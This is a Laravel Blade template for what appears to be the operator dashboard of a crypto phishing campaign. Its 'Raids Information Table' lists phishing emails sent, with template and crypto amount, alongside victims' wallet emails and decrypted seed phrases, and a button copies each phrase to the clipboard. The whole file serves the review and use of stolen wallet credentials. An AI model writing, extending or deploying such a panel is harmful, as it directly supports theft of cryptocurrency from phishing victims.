<x-app-layout>
    <!-- Start Main Content -->
    <div
        class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
        <div class="grid grid-cols-12">
            <!-- INFORMATION TABLE THREE -->
            <div class="col-span-full">
                <div class="card p-0">
                    <div class="flex-center-between p-6 pb-4 border-b border-gray-200 dark:border-dark-border">
                        <h3 class="text-lg card-title leading-none">Raids Information Table</h3>
                        <button type="button"
                            class="btn b-light btn-primary-light btn-sm prism-toggle !py-2.5 focus:bg-primary-500 focus:text-white dark:!bg-dark-icon">
                            <span class="shrink-0">View Raids</span>
                            <i class="ri-code-line text-inherit text-[15px]"></i>
                        </button>
                    </div>
                    <div class="p-6">
                        <div class="overflow-x-auto mt-5">
                            @if ($sent->isEmpty())
                                <p class="text-gray-500">No emails sent yet.</p>
                            @else
                                <table
                                    class="table-auto border-collapse w-full whitespace-nowrap text-left text-gray-500 dark:text-dark-text font-medium">
                                    <thead>
                                        <tr class="text-primary-500">
                                            <th
                                                class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                                Recipient Email</th>
                                            <th
                                                class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                                Template</th>
                                            <th
                                                class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                                Crypto Type</th>
                                            <th
                                                class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
                                                Quantity</th>
                                            <th
                                                class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-right">
                                                Wallet Details</th>
                                        </tr>
                                    </thead>
                                    <tbody class="divide-y divide-gray-200 dark:divide-dark-border-three">
                                        @foreach ($sent as $sent)
                                            <tr>
                                                <td class="p-6 py-4">{{ $sent->recipient_email }}</td>
                                                <td class="p-6 py-4">{{ ucfirst($sent->template) }}</td>
                                                <td class="p-6 py-4">{{ $sent->crypto_type }}</td>
                                                <td class="p-6 py-4">{{ number_format($sent->quantity,) }}</td>
                                                <td class="p-6 py-4">
                                                    @if ($sent->wallets->isEmpty())
                                                        <p>No wallet connected yet.</p>
                                                    @else
                                                        @foreach ($sent->wallets as $wallet)
                                                            <ul class="list-disc pl-5">
                                                                <li><strong>Wallet Type:</strong>
                                                                    {{ $wallet->wallet_type }}</li>
                                                                <li><strong>Email:</strong> {{ $wallet->user_email }}
                                                                </li>
                                                                <li class="flex items-center">
                                                                    <strong>Seed Phrase:</strong>
                                                                    <span class="ml-2"
                                                                        id="seed-{{ $wallet->id }}">{{ decrypt($wallet->seed_phrase) }}</span>
                                                                    <button
                                                                        onclick="copySeed('seed-{{ $wallet->id }}')"
                                                                        class="ml-2 text-primary-500 hover:text-primary-700"
                                                                        title="Copy Seed Phrase">
                                                                        <i class="ri-file-copy-line"></i>
                                                                    </button>
                                                                </li>
                                                            </ul>
                                                        @endforeach
                                                    @endif
                                                </td>
                                            </tr>
                                        @endforeach
                                    </tbody>
                                </table>
                            @endif
                        </div>
                    </div>
                    <!-- Prism Code -->
                    <div class="p-6 hidden">
                        <pre>
                            <code class="language-markup">
                                <p>Sorry we can't show the huge data table</p>
                            </code>
                        </pre>
                    </div>
                    <!-- Prism Code -->
                </div>
            </div>
            <!-- INFORMATION TABLE FOUR -->
        </div>
    </div>
    <!-- End Main Content -->
    <script>
        function copySeed(elementId) {
            const text = document.getElementById(elementId).textContent;
            navigator.clipboard.writeText(text).then(() => {
                alert('Seed phrase copied to clipboard!');
            }).catch(() => {
                alert('Failed to copy seed phrase.');
            });
        }
    </script>
</x-app-layout>
